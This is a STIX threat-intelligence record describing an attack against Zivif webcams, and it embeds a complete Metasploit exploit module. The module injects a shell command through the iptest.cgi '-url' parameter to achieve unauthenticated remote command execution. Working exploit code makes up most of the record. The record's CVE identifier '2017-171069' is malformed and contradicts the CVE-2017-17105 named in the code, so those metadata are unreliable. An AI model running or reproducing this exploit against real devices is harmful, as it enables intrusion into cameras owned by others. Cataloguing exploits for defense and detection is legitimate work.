{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3722638d-3146-4321-b1c8-fbcdba185f5c",
    "created": "2024-08-14T17:14:38.306743Z",
    "modified": "2024-08-14T17:14:38.306748Z",
    "name": "Zivif Camera iptest.cgi Blind Remote Command Execution",
    "description": " This module exploits a remote command execution vulnerability in Zivif webcams.  This is known to impact versions prior to and including v2.3.4.2103.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/zivif_ipcheck_exec.rb",
            "external_id": "zivif_ipcheck_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2017/Dec/42"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-171069"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zivif Camera iptest.cgi Blind Remote Command Execution',\n        'Description' => %q{\n          This module exploits a remote command execution vulnerability in Zivif\n          webcams.  This is known to impact versions prior to and including v2.3.4.2103.\n          Exploit was reported in CVE-2017-17105.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Silas Cutler (p1nk)' ],\n        'References' => [\n          [ 'URL', 'https://seclists.org/fulldisclosure/2017/Dec/42' ],\n          [ 'CVE', '2017-171069' ]\n        ],\n        'Platform' => 'unix',\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'Payload' => {\n          'Space' => 1024,\n          'BadChars' => \"\\x00\\x27\",\n          'DisableNops' => true,\n          'Compat' =>\n              {\n                'PayloadType' => 'cmd',\n                'RequiredCmd' => 'generic'\n              }\n        },\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/generic'\n        },\n        'Privileged' => false,\n        'DisclosureDate' => '2017-09-01',\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def check\n    res = send_request_cgi('uri' => normalize_uri('cgi-bin', 'iptest.cgi'))\n    unless res\n      vprint_error('Connection failed')\n      return Exploit::CheckCode::Unknown\n    end\n    unless res.code && res.code == 200\n      return CheckCode::Safe\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    print_status('Sending request')\n    cmd = datastore['CMD']\n\n    res = send_request_cgi(\n      'uri' => normalize_uri('cgi-bin', 'iptest.cgi'),\n      'method' => 'GET',\n      'vars_get' => {\n        'cmd' => 'iptest.cgi',\n        '-time' => Time.now.to_i,\n        '-url' => \"$(#{cmd})\"\n      }\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code && res.code == 200\n      print_good('Command sent successfully')\n    else\n      fail_with(Failure::UnexpectedReply, 'Unable to send command to target')\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        "[ Silas Cutler (p1nk) ]",
        ""
    ],
    "x_mitre_disclosure_date": "2017-09-01",
    "x_mitre_platforms": [
        "unix'"
    ]
}